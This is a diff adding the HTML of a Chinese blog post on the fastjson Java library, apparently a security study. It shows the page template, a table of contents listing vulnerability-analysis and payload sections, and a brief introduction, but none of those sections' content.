@@ -1,0 +1,1668 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  
+  <title>
+    fastjson |
+    
+    S@Ku_yA的blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="fastjsonfastjson是阿里巴巴提供的高性能json数据解析库 可以高效的将java对象转换为json数据  也可以接收json数据转换为原来的javaBean  虽然是一个很好用的json数据解析库 但是漏洞频出 java安全必学的一个组件 fastjson原理配置依赖 12345&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson">
+<meta property="og:url" content="http://example.com/2026/04/24/fastjson/index.html">
+<meta property="og:site_name" content="S@Ku_yA的blog">
+<meta property="og:description" content="fastjsonfastjson是阿里巴巴提供的高性能json数据解析库 可以高效的将java对象转换为json数据  也可以接收json数据转换为原来的javaBean  虽然是一个很好用的json数据解析库 但是漏洞频出 java安全必学的一个组件 fastjson原理配置依赖 12345&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424135526708.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424140524553.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424140541839.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424140938379.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424141054116.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424141305627.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424141542159.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424142012047.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424142315381.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424142421292.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424142813708.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424143422887.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424143748078.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424144007014.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424144149544.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424144219987.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424144420533.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424144346831.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424144523795.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424144650474.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424144851035.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424144917869.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424145956988.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424144943101.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424145051538.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424145306058.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424150501749.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424151126959.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424151511635.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424151552612.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424151726283.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424154018151.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424155245601.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424155535388.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424155632629.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424155735785.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424155803507.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424155848385.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424155930529.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424160047056.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424160126431.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260424160227564.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426130735792.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426130922921.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426131125376.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426131232465.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426131416977.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426131719853.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426131910213.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426132504510.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426132918313.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426133020943.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426133531421.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426133826062.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426133901974.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426134045622.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426134130147.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426134146055.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426134238385.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426134425595.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426134518405.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426135418773.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426135450785.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426135707172.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426140421765.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426140646263.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426140744061.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426140924953.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426141044491.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426141326394.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426141400756.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426141500775.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426141649436.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426141754214.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426142141482.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426142228592.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426142423829.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426142521786.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426142608021.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426150913025.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426150943605.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426151128404.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426151418674.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426151812104.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426152011864.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426152131102.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426152240297.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426152401427.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426153939894.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426154506228.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426154957854.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426155145628.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426155206619.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426155313097.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426155411396.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426155509404.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426155826528.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426155919175.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426160453424.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426161049628.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426200913120.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426201113367.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426201050860.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426201246988.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426201348532.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426201436770.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426201550585.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426201700823.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426201756161.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426202232895.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426202318778.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426202420016.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426202445057.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426202555971.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426202835582.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426203023100.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426203227795.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426203323932.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426205149577.png">
+<meta property="og:image" content="http://example.com/2026/04/24/fastjson/image-20260426205523486.png">
+<meta property="article:published_time" content="2026-04-24T05:45:59.000Z">
+<meta property="article:modified_time" content="2026-05-15T12:40:32.704Z">
+<meta property="article:author" content="S@Ku_yA">
+<meta property="article:tag" content="fastjson">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="java组件">
+<meta property="article:tag" content="知识">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/04/24/fastjson/image-20260424135526708.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="S@Ku_yA的blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+    
+      
+<link rel="stylesheet" href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css" integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr&#x2F;Io" crossorigin="anonymous">
+
+    
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+    
+  </nav>
+  
+</div>
+<header id="header" aria-label="Site header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="fastjson">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <span id="logo">
+            <h1 data-aos="slide-up">fastjson</h1>
+          </span>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  
+  <div class="sidebar-wrapper-container sticky">
+  
+    
+    
+  
+ 
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#fastjson"><span class="toc-number">1.</span> <span class="toc-text">fastjson</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">fastjson原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E4%B8%80%E4%B8%8B%E5%AF%B9%E8%B1%A1-to-json%E7%9A%84%E6%BA%90%E7%A0%81"><span class="toc-number">1.1.1.</span> <span class="toc-text">调试一下对象 to json的源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-json-to-javabean%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.1.2.</span> <span class="toc-text">反序列化 json to javabean对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.1.4.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7-%E5%85%B1%E6%9C%89%E5%B1%9E%E6%80%A7"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">私有属性 共有属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7%E4%BB%8D%E7%84%B6%E6%83%B3%E8%A2%AB%E8%B5%8B%E5%80%BC%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">私有属性仍然想被赋值该怎么办</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getter-setter"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">getter setter</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">fastjson漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-0-1-2-24"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.2.0~1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">分析一下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">总结一下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-25-1-2-41"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.2.25~1.2.41</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B-1"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">分析一下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B-1"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">总结一下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-42"><span class="toc-number">1.2.3.</span> <span class="toc-text">1.2.42</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B-2"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">分析一下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B-2"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">总结一下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-43"><span class="toc-number">1.2.4.</span> <span class="toc-text">1.2.43</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B-3"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">分析一下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B-3"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">总结一下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-44"><span class="toc-number">1.2.5.</span> <span class="toc-text">1.2.44</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B-4"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">分析一下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.2.6.</span> <span class="toc-text">&lt;&#x3D;1.2.47</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B-5"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">分析一下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B-4"><span class="toc-number">1.2.6.2.</span> <span class="toc-text">总结一下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-48"><span class="toc-number">1.2.7.</span> <span class="toc-text">1.2.48</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">1.2.8.</span> <span class="toc-text">&lt;&#x3D; 1.2.68</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B-6"><span class="toc-number">1.2.8.1.</span> <span class="toc-text">分析一下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B-5"><span class="toc-number">1.2.8.2.</span> <span class="toc-text">总结一下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-68"><span class="toc-number">1.2.9.</span> <span class="toc-text">&#x3D;&gt; 1.2.68</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-69"><span class="toc-number">1.2.10.</span> <span class="toc-text">1.2.69</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-83"><span class="toc-number">1.2.11.</span> <span class="toc-text">1.2.83</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson2"><span class="toc-number">1.2.12.</span> <span class="toc-text">fastjson2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96-1"><span class="toc-number">1.3.</span> <span class="toc-text">其他</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload%E5%A4%A7%E5%85%A8"><span class="toc-number">1.4.</span> <span class="toc-text">payload大全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96payload"><span class="toc-number">1.4.1.</span> <span class="toc-text">其他payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">小结</span></a></li></ol></li></ol>
+  
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="S@Ku_yA" class="lazyload">
+  <div class="sidebar-author-name">S@Ku_yA</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">43</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">26</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+  
+  <div class="sidebar-widget">
+  
+  </div>
+  
+  </div>
+  
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-fastjson" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-24T05:45:59.000Z" itemprop="datePublished">2026-04-24</time>
+    <time style="display: none;" id="post-update-time">2026-05-15</time>
+  </span>
+  
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Java%E5%AE%89%E5%85%A8/" title="Java安全">Java安全</a>
+  </div>
+
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1><p>fastjson是阿里巴巴提供的高性能json数据解析库 可以高效的将java对象转换为json数据 </p>
+<p>也可以接收json数据转换为原来的javaBean </p>
+<p>虽然是一个很好用的json数据解析库 但是漏洞频出 java安全必学的一个组件</p>
+<h2 id="fastjson原理"><a href="#fastjson原理" class="headerlink" title="fastjson原理"></a>fastjson原理</h2><p>配置依赖</p>
